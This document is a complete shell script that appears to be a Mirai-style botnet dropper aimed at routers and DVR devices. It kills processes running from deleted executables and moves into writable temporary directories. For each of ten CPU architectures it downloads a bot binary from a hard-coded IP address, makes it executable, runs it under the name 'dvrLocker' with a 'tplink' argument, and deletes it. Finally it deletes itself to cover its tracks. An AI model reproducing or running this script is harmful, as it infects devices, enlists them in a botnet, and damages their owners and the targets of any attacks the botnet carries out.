#!/bin/sh
n="arm arm5 arm6 arm7 m68k mips mipsel powerpc sh4 sparc"
http_server="103.149.28.141"

for proc_dir in /proc/*; do
    pid=${proc_dir##*/}

    result=$(ls -l "/proc/$pid/exe" 2> /dev/null)

    if [ "$result" != "${result%(deleted)}" ]; then
        kill -9 "$pid"
    fi
done

# send tmp-rw directories
cd /tmp
cd /var/tmp
cd /tmp/tmpfs
cd /dev/shm
cd /var/run

for a in $n
do
        # download and execute
        wget http://$http_server/la.bot.$a -O -> dvrLocker
        chmod 777 dvrLocker
        ./dvrLocker tplink.$a

        # remove new binary
        rm -rf dvrLocker
done

rm $0